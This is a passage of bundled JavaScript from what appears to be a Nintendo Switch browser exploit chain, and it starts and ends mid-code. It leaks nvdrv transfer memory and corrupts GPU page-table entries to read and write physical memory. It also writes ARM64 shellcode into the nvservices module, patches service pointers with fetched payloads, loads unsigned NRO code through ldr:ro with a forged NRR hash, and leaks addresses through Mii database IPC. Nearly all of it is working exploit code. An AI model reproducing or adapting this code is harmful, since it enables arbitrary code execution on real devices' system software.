	this.buf[0] = cval[0]; this.buf[1] = cval[1];
	this.protObj.gpu.ioctl(this.SET_USER_ADDRESS, this.buf);
};

var nvdev = function(name, hnd, tdsize) {
	this.hnd = hnd;
	var nbuf = utils.str2ab(name);
	utils.dlog('Opening nvdev ' + name);
	this.handle = window.sc.ipcMsg(0).data(tdsize).aDescriptor(nbuf, nbuf.byteLength, 0).sendTo(this.hnd).assertOk().data[0];
	utils.dlog('Handle: ' + this.handle.toString(16));
	window.sc.free(nbuf);
};

nvdev.prototype.ioctl = function(num, buf) {
	utils.dlog('Send ioctl');
	var resp = window.sc.ipcMsg(1).datau32(this.handle, num, 0, 0).aDescriptor(buf, buf.byteLength, 0).bDescriptor(buf, buf.byteLength, 0).xDescriptor(0, 0, 0).cDescriptor(0, 0).sendTo(this.hnd).assertOk();
	return resp.data[0];
};

nvdev.prototype.close = function() {
	window.sc.ipcMsg(2).data(this.handle, 0).sendTo(this.hnd);
};

var nvserv = function(tback) {
	this.svchnd = window.sc.getService('nvdrv:a').assertOk();
	this.tback = tback;
	this.tmem = window.sc.getArrayBufferAddr(this.tback);
	this.thandle = window.sc.svcCreateTransferMemory(tback.buffer, 0).assertOk();
	window.sc.ipcMsg(3).datau32(this.tback.byteLength).copyHandle(0xffff8001).copyHandle(this.thandle).sendTo(this.svchnd).assertOk();
};

nvserv.prototype.open = function(name) {
	return new nvdev(name, this.svchnd, this.tback.byteLength);
};

nvserv.prototype.leak = function() {
	window.sc.svcCloseHandle(this.svchnd).assertOk();
	window.sc.svcCloseHandle(this.thandle).assertOk();
	var is_leaked = false;
	while (!is_leaked) {
		is_leaked = (sc.svcQueryMem(this.tmem).assertOk()[3] == 'RW');
	}
	return this.tmem;
};


var nvown = function(tback) {
	this.svc = new nvserv(tback);
	this.gpu = this.svc.open('/dev/nvhost-gpu');
};

module.exports = nvcore;

nvcore.prototype.setup_gpu_rw = function() {
	var argBuf = new Uint32Array(0x100 / 4);
	var gmmuObj = new nvown(new Uint32Array(0x100000 / 4));
	this.gmmuObj = gmmuObj;
	gmmuObj.nvmap = gmmuObj.svc.open('/dev/nvmap');
	gmmuObj.as = gmmuObj.svc.open('/dev/nvhost-as-gpu');
	argBuf[0] = 0x20000;
	utils.log('IOC_CREATE:' +gmmuObj.nvmap.ioctl(0xC0080101, argBuf));
	var nvmap_handle = argBuf[1];
	utils.log('NVMAP HANDLE: '+nvmap_handle.toString(16));
	gmmuObj.bBuf = sc.malloc(0x2000);
	gmmuObj.bBufA = utils.add2(gmmuObj.bBuf, 0x1000);
	gmmuObj.bBufA[0] &= 0xFFFFF000;
	argBuf[0] = nvmap_handle;
	argBuf[1] = 0;
	argBuf[2] = 0;
	argBuf[3] = 0x1000;
	argBuf[4] = 0;
	argBuf[5] = 0;
	argBuf[6] = gmmuObj.bBufA[0];
	argBuf[7] = gmmuObj.bBufA[1];
	utils.log('IOC_ALLOC: ' +gmmuObj.nvmap.ioctl(0xC0200104, argBuf));
	argBuf[0] = gmmuObj.nvmap.handle;
	utils.log('SET_NVMAP_FD: ' + gmmuObj.gpu.ioctl(0x40044801, argBuf));
	argBuf[0] = 0;
	argBuf[1] = 0;
	argBuf[2] = 0;
	argBuf[3] = 0;
	utils.log('AS_INITIALIZE: '+gmmuObj.as.ioctl(0x40104107, argBuf));
	argBuf[0] = gmmuObj.gpu.handle;
	utils.log('AS_BIND_CHANNEL: '+gmmuObj.as.ioctl(0x40044101, argBuf));
	argBuf[0] = 4;
	argBuf[1] = 0x20000;
	argBuf[2] = 0;
	argBuf[3] = 0;
	argBuf[4] = 0x1000;
	argBuf[5] = 0;
	utils.log('AS_ALLOC_SPACE: '+gmmuObj.as.ioctl(0xC0184102, argBuf));
    this.gpuVaddr = [argBuf[4], argBuf[5]];
    utils.log('VADDR: '+utils.paddr(this.gpuVaddr));
	argBuf[0] = 1;
	argBuf[1] = 0xFF;
	argBuf[2] = nvmap_handle;
	argBuf[3] = 0;
	argBuf[4] = 0;
	argBuf[5] = 0;
	argBuf[6] = 0x20000;
	argBuf[7] = 0;
	argBuf[8] = 0;
	argBuf[9] = 0x00000004;
	utils.log('AS_MAP_BUFFER_EX: '+gmmuObj.as.ioctl(0xC0284106, argBuf));
	argBuf[0] = 0x200;
	argBuf[1] = 0x01;
	utils.log('GPU_ALLOC_GPFIFO: '+gmmuObj.gpu.ioctl(0x40084805, argBuf));
	argBuf[0]= 0xB0B5;
	argBuf[1] = 0;
	utils.log('GPU_ALLOC_OBJ_CTX: '+gmmuObj.gpu.ioctl(0xC0104809, argBuf));
	
	// :)
	utils.log('Looking for FACE...');
	var addr = [0, 0];
	var last = [0, 0];
	var faceAddr = null;
	while(true) {
		var mi = this.queryMem(addr, true);
		last = addr;
		addr = utils.add2(mi[0], mi[1]);
		if (mi[2][1] == 0xC && mi[1][1] == 0 && mi[1][0] <= 0x1000) {
			var face = this.rw.read(utils.add2(mi[0], 0x10));
			if (face[0] == 0xFACE) {
				faceAddr = mi[0];
				break;
			}
		}
		
		if(addr[1] < last[1]) {
			utils.log('End');
			break;
		}

	}
	if (faceAddr == null) {
		utils.log('Failed to find FACE! :(');
		return;
	}
	utils.log('Found FACE at '+utils.paddr(faceAddr));
	var pdeAddr = null;
	for (var i = 0; i < 10; i++) {
		var mi = this.queryMem(addr, true);
		last = addr;
		addr = utils.add2(mi[0], mi[1]);
		if (mi[2][1] == 0xC && mi[1][1] == 0 && mi[1][0] == 0x4000) {
			pdeAddr = mi[0];
			break;
		}
	}
	if (pdeAddr == null) {
		utils.log('Failed to find PTE! :(');
		return;
	}
	utils.log('Found PTE at '+utils.paddr(pdeAddr));
	var pteAddr = utils.add2(pdeAddr, 0x2000);
	var pte = this.rw.read(pteAddr);
	argBuf[0] = this.rw.read(utils.add2(faceAddr, 0x200))[0];
	argBuf[0] &= 0xFFFFFF00;
	argBuf[0] -= 0x20000;
	var pdeVa = this.rw.read(utils.add2(pdeAddr, 0x400));
	utils.log('First PTE entry: '+utils.paddr(pte));
    this.firstPte = pte;
	this.faceAddr = faceAddr;
	this.pteAddr = pteAddr;
	utils.log('IOVA: '+argBuf[0].toString(16));
    if (this.vers === '4.0.1' || this.vers == '4.1.0') {
        argBuf[0] += 0x10000;
        argBuf[0] = (0x80500000 | (argBuf[0] >>> 12));
    } else {
        argBuf[0] = (0x80400000 | (argBuf[0] >>> 12));
    }
	
	this.iovaVal = argBuf[0];
	utils.log('IOVA val: '+this.iovaVal.toString(16));

	var gpuMMIO = this.queryIOMapping(0x57000000, 0x1000000);
	this.gpuMMIO = gpuMMIO;
	utils.log('GPU MMIO at '+utils.paddr(gpuMMIO));
	
	this.pbusAddr = utils.add2(gpuMMIO, 0x1718);
	this.vaHighAddr = utils.add2(gpuMMIO, 0x6000C);
	this.vaLowAddr = utils.add2(gpuMMIO, 0x60010);
	this.gpuRWAddr = utils.add2(gpuMMIO, 0x60014);
	this.workBuf = new Uint32Array(10);

	this.modules = {};
	this.searchModules("nvservices");
	if(!this.modules.nvservices) {
		throw new Error("could not locate nvservices");
	}
	this.selfModule = this.modules.nvservices;
	this.physAddr = this.selfModule.physAddr;
	var freeSpace = this.selfModule.freeSpace;
	utils.log('Found NV at ' + this.physAddr.toString(16));
    
    var blob = new Uint32Array([0xD2800004, 0xB85FC005, 0xB8646823, 0xB9000003, 0x91001084, 0x110010A5, 0xB81FC005, 0x51001042, 0x7100005F, 0x54FFFF2C, 0xD65F03C0, 0xB9400023, 0xB9000003, 0x91001000, 0x51001042, 0x7100005F, 0x54FFFF6C, 0xD65F03C0, 0xF9000020, 0xF9000062, 0xD65F03C0]);
    for (var i = 0; i < blob.length; i++) {
        this.gpuWrite(blob[i], this.physAddr + 0x280 + i * 4);
    }
    utils.log('Wrote out blb');
    utils.log(utils.paddr(this.gpuRead(this.physAddr + 0x280)));
	
	/*
	this.selfModule.writeCodeBlob(new Uint32Array([0xB9400023, 0xB9000003, 0x91001000, 0x51001042, 0x7100005F, 0x54FFFF6C, 0xD65F03C0, 0xD4000A01, 0xAA0103E0, 0xD65F03C0, 0xD40007A1, 0xAA0103E0, 0xD65F03C0, 0xD40007C1, 0xD65F03C0, 0xD40007E1, 0xD65F03C0, 0xD4000DE1, 0xD65F03C0, 0xD4000F01, 0xD65F03C0]));

	utils.log("wrote blob");

	this.svcs[0x50] = freeSpace + (7 * 4);
	this.svcs[0x3D] = freeSpace + (10 * 4); 
	this.svcs[0x3E] = freeSpace + (13 * 4);
	this.svcs[0x3F] = freeSpace + (15 * 4);
	this.svcs[0x6F] = freeSpace + (17 * 4);
	this.svcs[0x78] = freeSpace + (19 * 4);*/
}

nvcore.prototype.prepare_close = function() {
    this.rw.write(this.firstPte, this.pteAddr);
    var ret = this.slowCall(0x280 + 18 * 4, [utils.add2(this.vicBase, 0x10000), utils.add2(this.vicBase, 0xF000), this.protUserAddr, utils.add2(this.protectedBase, 0xC008)]);
    this.callObj.svc.leak();
    utils.log('Call obj...');
    this.gmmuObj.svc.leak();
    utils.log('GMMU...');
    this.rw.protObj.svc.leak();
    utils.log('prot obj...');
    this.rw.vicObj.svc.leak();
    utils.log('vic obj...');
    return ret;
}

nvcore.prototype.load_payload = function() {
	var xhr = new XMLHttpRequest();
	xhr.open("GET", "/gmmupayload.bin", false);
	xhr.send(null);
	if(request.status !== 200) {
		throw new Error("xhr failure");
	}
	
	this.selfModule.writeCodeBlob(new Uint32Array(JSON.parse(xhr.responseText)));
}

class Module {
	constructor(nv, name, addr, details) {
		this.nv = nv;
		this.name = name;
		this.physAddr = addr;
		this.details = details;
		this.of = parseInt(this.details.of);
		//this.freeSpace = parseInt(details.freeSpace);
		//this.freeSpaceSize = parseInt(details.freeSpaceSize);
		this.freeSpace = 0x400; // rtld
		this.freeSpaceSize = 0xD00;
	}

	getAslrBase() {
		if(this.aslrBase) {
			return this.aslrBase;
		}
		var hdr = this.gpuRead8(this.of);
		if(hdr[0] != 0x30444f4d) { // MOD0
			throw new Error("not MOD0");
		}
		var modoff = this.gpuRead8(this.of + 0x18)[0];
		this.aslrBase = this.gpuRead8(this.of + modoff + 0x20);
		return this.aslrBase;
	}
	
	// blob should be a Uint32Array or compatible
	writeCodeBlob(blob) {
		if(blob.byteLength > this.freeSpaceSize) {
			throw new Error("blob is too long");
		}
		utils.log("writing blob to " + this.name);
		this.nv.gpuWriteBuffer(this.physAddr + this.freeSpace, blob, blob.byteLength);
		utils.log("verifying...");
		var st = this.nv.gpuRead(this.physAddr + this.freeSpace);
		if(st[0] != blob[0] || st[1] != blob[1]) {
			throw new Error("failed to verify blob");
		}
		utils.log("verified");
	}

	gpuRead8(offset) {
		return this.nv.gpuRead(this.physAddr + offset);
	}

	gpuWrite4(val, offset) {
		return this.nv.gpuWrite(utils.trunc32(val), this.physAddr + offset);
	}

	writePayloadAndPatch(s_table) {
		if(this.genericCore) {
			return this.genericCore;
		}
		var xhr = new XMLHttpRequest();
		xhr.open("GET", "/"+this.name+"payload.bin", false);
		xhr.send(null);
		if(xhr.status !== 200) {
			throw new Error("xhr failure " + xhr.status);
		}
		this.writeCodeBlob(new Uint32Array(new Uint8Array(JSON.parse(xhr.responseText)).buffer));

		var aslr = this.getAslrBase();
		var origptr = this.gpuRead8(s_table);
		utils.log("orig ptr: " + utils.paddr(origptr) + " (aslr+" + utils.paddr(utils.sub2(origptr, aslr)) + ")");
		var payload = utils.add2(this.getAslrBase(), this.freeSpace);
		this.gpuWrite4(payload[0], s_table);
		this.gpuWrite4(payload[1], s_table + 4);
		
		var newptr = this.gpuRead8(s_table);
		utils.log("new ptr: " + utils.paddr(newptr) + " (aslr+" + utils.paddr(utils.sub2(newptr, aslr)) + ")");
	}
}

nvcore.prototype.probeModule = function(addr, of) {
	utils.log("NSO at 0x" + addr.toString(16) + ": 0x" + of.toString(16));
	for(var i = 0; i < nsoInfo.length; i++) {
		var info = nsoInfo[i];
		for(var j = 0; j < info.variations.length; j++) {
			var variation = info.variations[j];
			if(parseInt(variation.of) == of) {
				var name = info.name;
				if(this.modules[name]) {
					utils.log("  => (already probed '" + name + "' variation " + variation.versions);
					return this.modules[name];
				} else {
					utils.log("  => found '" + name + "' variation " + variation.versions + " at 0x" + addr.toString(16));
					var mod = new Module(this, name, addr, variation);
					this.modules[name] = mod;
					return mod;
				}
			}
		}
	}
	utils.log("  => unknown module");
}

nvcore.prototype.searchModules = function(tryhard) {
	utils.log("non-tryhard search");
	for(var i = 0; i < nsoInfo.length; i++) {
		for(var j = 0; j < nsoInfo[i].addrs.length; j++) {
			var addr = parseInt(nsoInfo[i].addrs[j]);
			var val = this.gpuRead(addr);
			if(val[0] == 0x14000002) {
				this.probeModule(addr, val[1]);
			}
		}
	}
	if(!tryhard || this.modules[tryhard]) {
		return;
	}
	
	utils.log("tryhard search for '" + tryhard + "'");
	addr = 0x81900000;
	while(!this.modules[tryhard]) {
		var val = this.gpuRead(addr);
		if(val[0] == 0x14000002) {
			this.probeModule(addr, val[1]);
		}
		addr+= 0x100000;
        if (addr == 0xFFF00000){
            break;
        }
	}
}

nvcore.prototype.queryMem = function(addr, raw) {
	if(arguments.length == 1)
		raw = false;

	var meminfo = utils.add2(this.ropBase, 0x40000);
	var pageinfo = utils.add2(this.ropBase, 0x40028);

	var memperms = ['NONE', 'R', 'W', 'RW', 'X', 'RX', 'WX', 'RWX'];
	var memstates = ['NONE', '(1)', '(2)', 'CODE-STATIC', 'CODE', 'HEAP', 'SHARED-MEM-BLOCK', 'MODULE-CODE-STATIC', 'MODULE-CODE', 'STACK-MIRROR', 'THREAD-LOCAL-STORAGE', 'MEMORY_MIRROR', '(15)', 'RESERVED'];
	this.svc(0x6, [meminfo, pageinfo, addr]);

	var ms = this.rw.read(utils.add2(meminfo, 0x10));
	if (!raw) ms =	utils.paddr(ms);
	/*if(!raw && ms[1] == 0 && ms[0] < memstates.length)
		ms = memstates[ms[0]];
		else if(!raw)
		ms = 'UNKNOWN'*/
	var mp = this.rw.read(utils.add2(meminfo, 0x18));
	if(!raw && mp[1] == 0 && mp[0] < memperms.length)
		mp = memperms[mp[0]];

	var data = [this.rw.read(meminfo), this.rw.read(utils.add2(meminfo, 8)), ms, mp, this.rw.read(pageinfo)];

	return data;
};

nvcore.prototype.gpuRead4 = function(addr) {
	//this.pbusAddr = utils.add2(gpuMMIO, 0x1718);
	//this.vaLowAddr = utils.add2(gpuMMIO, 0x6000C);
	//this.vaHighAddr = utils.add2(gpuMMIO, 0x60010);
	//this.gpuRWAddr = utils.add2(gpuMMIO, 0x60014);
	if (typeof(addr) !== 'number') {
		addr = addr[0];
	}
	this.workBuf[0] = addr;
	this.workBuf[0] &= 0xFFFE0000;
	this.workBuf[1] = addr - this.workBuf[0];
	this.workBuf[0] /= 0x100;
	this.workBuf[0] |= 0x00000001;
	//utils.log('Corrupting PTE...'+this.workBuf[0].toString(16)+','+this.workBuf[2]);
	this.rw.write([this.workBuf[0], 1], this.pteAddr);
	//utils.log('Flushing TLB...');
	this.write4(0x80000001, utils.add2(this.gpuMMIO, 0x100cbc));
	//utils.log('Writing iovaVal');
	this.write4(this.iovaVal, this.pbusAddr);
	//utils.log('Writing VA low: '+this.workBuf[1].toString(16));
	this.write4(this.workBuf[1], this.vaLowAddr);
	//utils.log('Writing VA high');
	this.write4(this.gpuVaddr[1], this.vaHighAddr);
	//utils.log('About to read...');
	return this.read4(this.gpuRWAddr)[0];
}

nvcore.prototype.gpuRead = function(addr) {
	if (typeof(addr) !== 'number') {
		addr = addr[0];
	}
	this.workBuf[0] = addr;
	this.workBuf[0] &= 0xFFFE0000;
	this.workBuf[1] = addr - this.workBuf[0];
	this.workBuf[0] /= 0x100;
	this.workBuf[0] |= 0x00000001;
	//utils.log('Corrupting PTE...'+this.workBuf[0].toString(16)+','+this.workBuf[2]);
	this.rw.write([this.workBuf[0], 1], this.pteAddr);
	//utils.log('Flushing TLB...');
	this.write4(0x80000001, utils.add2(this.gpuMMIO, 0x100cbc));
	//utils.log('Writing iovaVal');
	this.write4(this.iovaVal, this.pbusAddr);
	//utils.log('Writing VA low: '+this.workBuf[1].toString(16));
	this.write4(this.workBuf[1], this.vaLowAddr);
	//utils.log('Writing VA high');
	this.write4(this.gpuVaddr[1], this.vaHighAddr);
	//utils.log('About to read...');
	return [this.read4(this.gpuRWAddr)[0], this.read4(this.gpuRWAddr)[0]];
}

nvcore.prototype.gpuDumpPage = function(addr) {
	if (typeof(addr) !== 'number') {
		addr = addr[0];
	}
	this.workBuf[0] = addr;
	this.workBuf[0] &= 0xFFFE0000;
	this.workBuf[1] = addr - this.workBuf[0];
	this.workBuf[0] /= 0x100;
	this.workBuf[0] |= 0x00000001;
	//utils.log('Corrupting PTE...'+this.workBuf[0].toString(16)+','+this.workBuf[2]);
	this.rw.write([this.workBuf[0], 1], this.pteAddr);
	//utils.log('Flushing TLB...');
	this.write4(0x80000001, utils.add2(this.gpuMMIO, 0x100cbc));
	//utils.log('Writing iovaVal');
	this.write4(this.iovaVal, this.pbusAddr);
	//utils.log('Writing VA low: '+this.workBuf[1].toString(16));
	this.write4(0, this.vaLowAddr);
	//utils.log('Writing VA high');
	this.write4(this.gpuVaddr[1], this.vaHighAddr);
	//utils.log('About to read...');
	var buf = new Uint32Array(0x20000 / 4);
	this.slowCall(0x280 + (11 * 4), [this.pageBuf, this.gpuRWAddr, 0x20000]);
	this.memcpyToBrowser(sc.getArrayBufferAddr(buf), this.pageBuf, 0x20000);
	return buf;
}
nvcore.prototype.gpuDumpPageToBuf = function(addr, buf, len) {
	if (typeof(addr) !== 'number') {
		addr = addr[0];
	}
	this.workBuf[0] = addr;
	this.workBuf[0] &= 0xFFFE0000;
	this.workBuf[1] = addr - this.workBuf[0];
	this.workBuf[0] /= 0x100;
	this.workBuf[0] |= 0x00000001;
	//utils.log('Corrupting PTE...'+this.workBuf[0].toString(16)+','+this.workBuf[2]);
	this.rw.write([this.workBuf[0], 1], this.pteAddr);
	//utils.log('Flushing TLB...');
	this.write4(0x80000001, utils.add2(this.gpuMMIO, 0x100cbc));
	//utils.log('Writing iovaVal');
	this.write4(this.iovaVal, this.pbusAddr);
	//utils.log('Writing VA low: '+this.workBuf[1].toString(16));
	this.write4(0, this.vaLowAddr);
	//utils.log('Writing VA high');
	this.write4(this.gpuVaddr[1], this.vaHighAddr);
	//utils.log('About to read...');
	this.slowCall(0x280 + (11 * 4), [this.pageBuf, this.gpuRWAddr, 0x20000]);
	this.memcpyToBrowser(buf, this.pageBuf, len);
}


nvcore.prototype.gpuWrite = function(val, addr) {
	if (typeof(addr) !== 'number') {
		addr = addr[0];
	}
	this.workBuf[0] = addr;
	this.workBuf[0] &= 0xFFFE0000;
	this.workBuf[1] = addr - this.workBuf[0];
	this.workBuf[0] /= 0x100;
	this.workBuf[0] |= 0x00000001;
	//utils.log('Corrupting PTE...'+this.workBuf[0].toString(16)+','+this.workBuf[2]);
	this.rw.write([this.workBuf[0], 1], this.pteAddr);
	//utils.log('Flushing TLB...');
	this.write4(0x80000001, utils.add2(this.gpuMMIO, 0x100cbc));
	//utils.log('Writing iovaVal');
	this.write4(this.iovaVal, this.pbusAddr);
	//utils.log('Writing VA low: '+this.workBuf[1].toString(16));
	this.write4(this.workBuf[1], this.vaLowAddr);
	//utils.log('Writing VA high');
	this.write4(this.gpuVaddr[1], this.vaHighAddr);
	//utils.log('About to read...');
	this.write4(val, this.gpuRWAddr);
}

nvcore.prototype.gpuWriteBuffer = function(addr, buf, len) {
	if (typeof(addr) !== 'number') {
		addr = addr[0];
	}
    if (ArrayBuffer.isView(buf) || buf instanceof ArrayBuffer) {
        var bufAddr = sc.getArrayBufferAddr(buf);
    } else {
        var bufAddr = buf;
    }	
    this.workBuf[0] = addr;
	this.workBuf[0] &= 0xFFFE0000;
	this.workBuf[1] = addr - this.workBuf[0];
	this.workBuf[0] /= 0x100;
	this.workBuf[0] |= 0x00000001;
	//utils.log('Corrupting PTE...'+this.workBuf[0].toString(16)+','+this.workBuf[2]);
	this.rw.write([this.workBuf[0], 1], this.pteAddr);
	//utils.log('Flushing TLB...');
	this.write4(0x80000001, utils.add2(this.gpuMMIO, 0x100cbc));
	//utils.log('Writing iovaVal');
	this.write4(this.iovaVal, this.pbusAddr);
	//utils.log('Writing VA low: '+this.workBuf[1].toString(16));
	this.write4(this.workBuf[1], this.vaLowAddr);
	//utils.log('Writing VA high');
	this.write4(this.gpuVaddr[1], this.vaHighAddr);
	//utils.log('About to read...');
    this.memcpyFromBrowser(this.pageBuf, bufAddr, len);
	this.slowCall(0x280, [this.gpuRWAddr, this.pageBuf, len]);
}


},{"./nso_info2.json":12,"./sploitMixin":17,"./svc":19,"./utils":20}],15:[function(require,module,exports){
/*
	requires spl MITM and ro!ease_nro_restriction = 0x1
*/

var utils = require("./utils")

module.exports = (res, args) => {
	if(!sc.sdb) {
		throw new Error("requires spl mitm. try `enable sdbcore`");
	}
	if(sc.version !== "3.0.0") {
		throw new Error("requires 3.0.0");
	}
	
	var nrr = new ArrayBuffer(0x1000);
	var nrru32 = new Uint32Array(nrr);
	nrru32[0] = 0x3052524E; // NRR0
	nrru32[(0x338 >> 2) + 0] = 0x1000; // Size
	nrru32[(0x340 >> 2) + 0] = 0x350; // Hash offset
	nrru32[(0x340 >> 2) + 1] = 0x1; // Hash count
	
	while(res.length & 0xFFF)
		res.push(0);
	var u8 = new Uint8Array(res);
	var u32 = new Uint32Array(u8.buffer);

	var nroSize = u32[0x18 >> 2];
	var bssSize = u32[0x38 >> 2];
	var mod0Offset = u32[1];
	var dynamicOffset = mod0Offset + u32[(mod0Offset >> 2) + 1];

	utils.log("dynamic offset: 0x" + dynamicOffset.toString(16));

	return crypto.subtle.digest("SHA-256", u8.buffer).then((hash) => {
		var nrrhashu8 = new Uint8Array(nrr, 0x350, 32);
		var hashu8 = new Uint8Array(hash);
		nrrhashu8.set(hashu8);
		
		return sc.getService("ldr:ro", (ldrro) => {
			var nrraddr = sc.getArrayBufferAddr(nrr);
			sc.ipcMsg(4).datau64(0).sendPid().copyHandle(0xffff8001).sendTo(ldrro).assertOk();
			sc.ipcMsg(2).datau64(0, nrraddr, nrr.byteLength).sendPid().sendTo(ldrro).show();
			
			var nrobase = sc.malloc(u8.length + bssSize + 0xfff);
			if(nrobase[0] & 0xFFF)
				nrobase[0] = ((nrobase[0] & 0xFFFFF000) + 0x1000) >>> 0;
			
			sc.memcpy(nrobase, u8, u8.byteLength);
			
			sc.svcNroBase = sc.ipcMsg(0).datau64(0, nrobase, nroSize, utils.add2(nrobase, nroSize), bssSize).sendPid().sendTo(ldrro).assertOk().data;

			sc.ipcMsg(3).datau64(0, nrraddr).sendPid().sendTo(ldrro).assertOk();
			
			utils.log('NRO loaded at ' + utils.paddr(sc.svcNroBase));

			if(args === undefined) {
				args = [];
			}
			var argAbs = args.map((arg) => utils.str2ab(arg));
			var argv = new Uint32Array(argAbs.length * 2);
			for(var i = 0; i < argAbs.length; i++) {
				var addr = sc.getArrayBufferAddr(argAbs[i]);
				argv[(i*2)+0] = addr[0];
				argv[(i*2)+1] = addr[1];
			}
			utils.hexdump("argv", argv);

			var argvAddr = sc.getArrayBufferAddr(argv);

			var magic = utils.parseAddr("007874635f656361");
			var appHeap = new ArrayBuffer(0x400000);
			var appHeapAddr = sc.getArrayBufferAddr(appHeap);

			var loaderConfig = new Uint32Array([
				3, // key (OverrideHeap)
				1, // flags ([RECOGNITION-MANDATORY])
				appHeapAddr[0], appHeapAddr[1], // value[0]
				appHeap.byteLength, 0, // value[1]

				5, // key (Argv)
				0, // flags
				argAbs.length, 0, // value[0]
				argvAddr[0], argvAddr[1], // value[1]

				8, // key (AppletWorkaround)
				1, // flags ([RECOGNITION-MANDATORY])
				0, 0, // value[0] (aruid)
				0, 0, // value[1] (ignored)
				
				0, // key (EndOfList)
				1, // flags ([RECOGNITION-MANDATORY])
				0, 0, 0, 0, // value[0], (ignored) value[1] (ignored)
			]);
			
			utils.log("closing sm and jumping...");
			sc.svcCloseHandle(sc.smHandle).assertOk();
			sc.smHandle = undefined;
			var ret = sc.call(sc.svcNroBase, [loaderConfig]);
			utils.log("returned " + utils.paddr(ret));
			return ret;
		});
	}).catch((e) => {
		utils.log("error in then()");
		window.onerror(e.message, null, e.line, null, e);
	});
};

},{"./utils":20}],16:[function(require,module,exports){
var utils = require('./utils');
var svcMixin = require('./svc');
var sploitMixin = require('./sploitMixin');

function c32to8(data)
{
	var len = data.length;
	var ret = new Uint8Array(len * 4);
	var offs = 0;

	for(i = 0; i < len; i++)
	{
		ret[offs++] = data[i] & 0xFF;
		ret[offs++] = (data[i] >>> 8) & 0xFF;
		ret[offs++] = (data[i] >>> 16) & 0xFF;
		ret[offs++] = data[i] >>> 24;
	}

	return ret;
}

function c64to8(data)
{
	var len = data.length;
	var ret = new Uint8Array(len * 8);
	var offs = 0;

	for(i = 0; i < len; i++)
	{
		ret[offs++] = data[i][0] & 0xFF;
		ret[offs++] = (data[i][0] >>> 8) & 0xFF;
		ret[offs++] = (data[i][0] >>> 16) & 0xFF;
		ret[offs++] = (data[i][0] >>> 24) & 0xFF;
		ret[offs++] = data[i][1] & 0xFF;
		ret[offs++] = (data[i][1] >>> 8) & 0xFF;
		ret[offs++] = (data[i][1] >>> 16) & 0xFF;
		ret[offs++] = (data[i][1] >>> 24) & 0xFF;
	}

	return ret;
}

function c8to32(data)
{
	var len = data.length / 4;
	var ret = new Uint32Array(len);
	var offs = 0;

	for(i = 0; i < len; i++)
	{
		ret[i] = data[offs++];
		ret[i] |= data[offs++] << 8;
		ret[i] |= data[offs++] << 16;
		ret[i] |= data[offs++] << 24;
	}

	return ret;
}

function _crc(data, len)
{
	var crc = 0;

	for(j = 0; j < len; j++)
	{
		var v = 0x80;
		for(i = 0; i < 8; i++)
		{
			var xorf = crc & 0x8000;
			crc = (crc << 1) & 0xFFFF

			if(data[j] & v)
				crc = (crc + 1) & 0xFFFF;
			if(xorf)
				crc ^= 0x1021;
			v >>= 1;
		}
	}
	return crc;
}

function writePdm(payload)
{
//	var data = payload.buffer;
//	utils.hexdump("dat", data);
	sc.ipcMsg(4).sendTo('pdm:ntfy').assertOk();
//	sc.ipcMsg(5).aDescriptor(data, data.byteLength, 0).sendTo('pdm:ntfy').assertOk();
	sc.ipcMsg(5).aDescriptor(payload, payload.length, 0).sendTo('pdm:ntfy').assertOk();
}

function getMiiAuthorId()
{
	return c32to8(sc.ipcMsg(90).sendTo('set:sys').assertOk().data);
}

function crcMiiBuf(b, authorid)
{
	var ret = new Uint8Array(b.length + 4);
	ret.set(b);

	var crc1 = _crc(ret, b.length + 2);
	ret[b.length] = crc1 >> 8;
	ret[b.length+1] = crc1 & 0xFF;

	var temp = new Uint8Array(authorid.length + ret.length);
	temp.set(authorid);
	temp.set(ret, authorid.length);

	var crc2 = _crc(temp, temp.length);
	ret[b.length+2] = crc2 >> 8;
	ret[b.length+3] = crc2 & 0xFF;

	return ret;
}

function AddOrReplace(hnd, key, unm, authorid)
{
	var crcbuf = new Uint8Array(unm.length + key.length);
	crcbuf.set(unm);
	crcbuf.set(key, unm.length);
	crcbuf = crcMiiBuf(crcbuf, authorid);

	var new_mii = new Uint8Array(crcbuf.length + 4);
	new_mii.set(crcbuf);

	var new_mii_as_words = c8to32(new_mii);

	var ipc = sc.ipcMsg(13);
	ipc.datau32.apply(ipc, new_mii_as_words);
	ipc.sendTo(hnd).assertOk();
}

function Move(hnd, key, pos)
{
	var data = new Uint32Array(key.length / 4 + 1);
	data.set(c8to32(key));
	data[data.length - 1] = pos;
	var ipc = sc.ipcMsg(12);
	ipc.datau32.apply(ipc, data);
	ipc.sendTo(hnd).assertOk();
}

function Delete(hnd, key)
{
	var data = c8to32(key);
	var ipc = sc.ipcMsg(14);
	ipc.datau32.apply(ipc, data);
	ipc.sendTo(hnd).assertOk();
}

function GetCount(hnd)
{
	ret = sc.ipcMsg(2).datau32(1).sendTo(hnd).assertOk().data[0];
//	utils.log("mii count is " + ret.toString());
	return ret;
}

function GetDefault(hnd, offset)
{
	ret = sc.ipcMsg(7).datau32(offset).sendTo(hnd).assertOk();
	return ret.data;
}

function GetLoadBase(hnd, authorid)
{
	var unm = new Uint8Array([0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x97, 0x02, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0x41, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0]);
	var key = c64to8([[0xcafe, 0], [0xcafe0080, 0]]);

	AddOrReplace(hnd, key, unm, authorid);

	var data = GetDefault(hnd, (0x010b4b20 + 0xC + 0x44 * (GetCount(hnd) - 1) - 0x01079438) / 4);

	Delete(hnd, key);

	return utils.add2([data[5], data[6]], -0x9c540);
}

function Wipe(hnd)
{
	var buf = new Uint8Array(100*0x44);
	var count = sc.ipcMsg(9).data(1).bDescriptor(buf, buf.length, 0).sendTo(hnd).assertOk().data[0];

	if(!count)
		return;

	utils.log("mii count to delete " + count.toString());

	var key = new Uint8Array(16);

	for(mii = 0; mii < count; mii++)
	{
		for(j = 0; j < 16; j++)
			key[j] = buf[j + 48 + mii * 0x44];
		Delete(hnd, key);
	}
}


function getServicePid(service)
{
	var res = sc.ipcMsg(2).setType(3).datau64(0).sendTo(service).assertOk();
	sc.svcCloseHandle(res.movedHandles[0]);
	return res.pid[0];
}

function checkMiiCode(code)
{
